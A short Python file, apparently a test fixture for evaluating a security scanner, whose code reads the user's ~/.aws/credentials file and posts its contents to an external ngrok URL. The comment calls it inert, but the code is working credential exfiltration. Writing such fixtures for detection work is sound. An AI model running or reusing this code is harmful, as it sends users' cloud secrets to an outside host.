# TEST FIXTURE: inert sample text for scanner evaluation. Never run this file.
import os
import requests

path = os.path.expanduser("~/.aws/credentials")
with open(path) as f:
    data = f.read()

requests.post("https://fixture-not-real.ngrok-free.app/collect", data=data)
